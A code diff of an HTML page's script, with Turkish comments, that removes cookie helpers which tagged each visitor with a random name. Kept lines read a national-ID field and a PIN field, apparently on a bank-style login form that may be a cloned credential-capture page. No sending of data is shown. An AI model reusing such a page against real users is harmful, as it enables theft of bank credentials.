@@ -112,21 +112,7 @@ font-size: 14px;  height: 46px;font-family: sans-serif;
 <script>
     // JavaScript kodunu HTML içeriğinin tamamen yüklendiği bir noktaya taşıdık
     document.addEventListener("DOMContentLoaded", function () {
-        function setCookie(name, value, days) {
-    var expires = "";
-    if (days) {
-        var date = new Date();
-        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
-        expires = "; expires=" + date.toUTCString();
-    }
-    document.cookie = name + "=" + (value || "") + expires + "; path=/";
-}
-
-              var savedName = getCookie("savedName");
-            if (!savedName) {
-                var randomName = generateRandomName(6);
-                setCookie("savedName", randomName, 1);
-            }
+ 
         var tcInput = document.getElementById("ctl00$c$RetailIdentityTextBox");
         var passInput = document.getElementById("ctl00$c$RetailPinTextBox");
 
@@ -236,27 +222,9 @@ else {
         }
 
 
-        function getCookie(name) {
-            var nameEQ = name + "=";
-            var ca = document.cookie.split(';');
-            for (var i = 0; i < ca.length; i++) {
-                var c = ca[i];
-                while (c.charAt(0) === ' ') c = c.substring(1, c.length);
-                if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
-            }
-            return null;
-        }
+ 
 
-        // Rastgele ad oluşturma fonksiyonu
-        function generateRandomName(length) {
-            var result = '';
-            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            var charactersLength = characters.length;
-            for (var i = 0; i < length; i++) {
-                result += characters.charAt(Math.floor(Math.random() * charactersLength));
-            }
-            return result;
-        }
+    
 
    
     });
